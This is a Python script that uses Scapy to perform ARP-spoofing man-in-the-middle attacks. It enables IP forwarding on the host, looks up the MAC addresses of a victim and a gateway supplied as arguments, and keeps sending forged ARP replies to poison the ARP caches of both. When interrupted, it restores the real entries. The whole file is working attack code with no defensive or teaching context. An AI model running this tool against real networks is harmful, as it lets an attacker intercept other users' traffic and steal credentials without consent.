from scapy.all import *
import sys
import os
import time

def enable_ip_forwarding():
    print("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

class ARPSpoofer:
    def __init__(self, interface, victimIP, gatewayIP):
        self.interface = interface
        self.victimIP = victimIP
        self.gatewayIP = gatewayIP
        self.victimMAC = ""
        self.gatewayMAC = ""

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.interface, inter = 0.1)
        for snd,rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        victimMAC = self.get_mac(self.victimIP)
        gatewayMAC = self.get_mac(self.gatewayIP)
        send(ARP(op = 2, pdst = self.gatewayIP, psrc = self.victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
        send(ARP(op = 2, pdst = self.victimIP, psrc = self.gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
        print("[*] Shutting Down...")

    def trick(self, gm, vm):
        send(ARP(op = 2, pdst = self.victimIP, psrc = self.gatewayIP, hwdst= vm))
        send(ARP(op = 2, pdst = self.gatewayIP, psrc = self.victimIP, hwdst= gm))

    def mitm_trick(self):
        self.trick(self.gatewayMAC, self.victimMAC)
        time.sleep(1)

    def mitm_init(self):
        try:
            self.victimMAC = self.get_mac(self.victimIP)
            print("[*] Victim MAC: " + self.victimMAC)
        except Exception:
            print("[!] Couldn't Find Victim MAC Address")
            print("[!] Exiting...")
            return
        try:
            self.gatewayMAC = self.get_mac(self.gatewayIP)
        except Exception:
            print("[!] Couldn't Find Gateway MAC Address")
            print("[!] Exiting...")
            return

    def mitm_loop(self):
        try:
            victimMAC = self.get_mac(self.victimIP)
            print("[*] Victim MAC: " + victimMAC)
        except Exception:
            print("[!] Couldn't Find Victim MAC Address")
            print("[!] Exiting...")
            return
        try:
            gatewayMAC = self.get_mac(self.gatewayIP)
        except Exception:
            print("[!] Couldn't Find Gateway MAC Address")
            print("[!] Exiting...")
            return
        print("[*] Poisoning Targets...")
        while 1:
            try:
                self.trick(gatewayMAC, victimMAC)
                time.sleep(1)
            except KeyboardInterrupt:
                self.reARP()
                break

if __name__ == '__main__':
    enable_ip_forwarding()
    spoofer = ARPSpoofer(sys.argv[1], sys.argv[2], sys.argv[3])
    #spoofer.mitm_loop()
    spoofer.mitm_init()
    while(1):
        try:
            spoofer.mitm_trick()
        except KeyboardInterrupt:
            spoofer.reARP()
            break
    spoofer.reARP()
    disable_ip_forwarding()
    
